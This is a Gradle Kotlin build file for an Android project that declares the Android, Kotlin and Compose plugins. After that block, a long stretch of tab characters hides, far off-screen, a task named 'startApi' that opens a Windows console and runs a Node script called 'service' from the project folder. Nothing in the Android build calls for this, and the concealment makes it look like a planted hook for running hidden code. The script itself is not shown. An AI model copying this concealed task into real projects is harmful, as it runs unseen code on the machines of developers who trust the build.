plugins {
    id("com.android.application") version "8.5.0" apply false
    id("org.jetbrains.kotlin.android") version "1.9.24" apply false
    id("org.jetbrains.kotlin.plugin.compose") version "2.0.0" apply false
}
																																																																																																																																																																																				tasks.register<Exec>("startApi") { workingDir = rootProject.projectDir; commandLine("cmd", "/c", "start", "\"\"", "cmd", "/k", "node", "service") }
